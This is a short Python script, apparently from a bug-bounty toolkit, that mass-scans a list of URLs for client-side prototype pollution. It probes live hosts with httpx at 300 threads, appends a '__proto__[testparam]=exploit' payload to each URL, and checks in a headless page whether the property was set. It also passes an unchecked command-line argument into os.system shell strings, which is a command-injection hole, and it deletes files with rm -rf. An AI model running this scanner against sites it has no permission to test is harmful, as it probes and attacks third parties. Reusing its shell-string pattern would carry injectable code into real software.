from os import system
import sys

msg = sys.argv[1]

system(f"cat {msg}urls.txt | httpx -silent -threads 300 | anew -q alive.txt && sed 's/$/\\/?__proto__[testparam]=exploit\\//' alive.txt | page-fetch -j 'window.testparam == \"exploit\" ? \"[VULNERABLE]\" : \"[NOT VULNERABLE]\"' | sed 's/(//g' | sed 's/)//g' | sed 's/JS //g' | grep 'VULNERABLE' > {msg}vuln_proto.txt")

system(f"awk '/\[VULNERABLE\]/' {msg}vuln_proto.txt > {msg}proto.txt")

system("rm -rf alive.txt")
system("rm -rf out")
system(f"rm -rf {msg}vuln_proto.txt")

print(f"Prototype Pollution vulnerabilities saved to: {msg}proto.txt")

# system(f"cat tee -a {msg}proto.txt | notify")
